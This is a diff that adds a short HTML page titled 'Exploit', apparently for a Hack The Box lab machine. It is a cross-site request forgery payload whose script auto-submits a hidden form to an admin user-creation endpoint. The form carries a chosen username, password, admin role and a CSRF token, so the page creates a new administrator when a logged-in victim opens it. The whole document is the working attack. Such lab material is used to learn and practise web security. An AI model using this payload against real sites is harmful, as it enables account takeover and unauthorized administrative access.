@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Exploit</title>
+</head>
+<body>
+<h1>Exploit</h1>
+<form id="Form" action="http://portal.guardian.htb/admin/createuser.php" method="POST">
+    <input type="hidden" name="username" value="bl0rph">
+    <input type="hidden" name="password" value="Admin123!">
+    <input type="hidden" name="full_name" value="New Admin">
+    <input type="hidden" name="email" value="admin@admin.com">
+    <input type="hidden" name="new_admin" value="2007-02-26">
+    <input type="hidden" name="address" value="street">
+    <input type="hidden" name="user_role" value="admin">
+    <input type="hidden" name="csrf_token" value="a742b5afd22001495f43c25746aa2c94">
+</form>
+<script>
+    document.getElementById('Form').submit();
+</script>
+</body>
+</html>
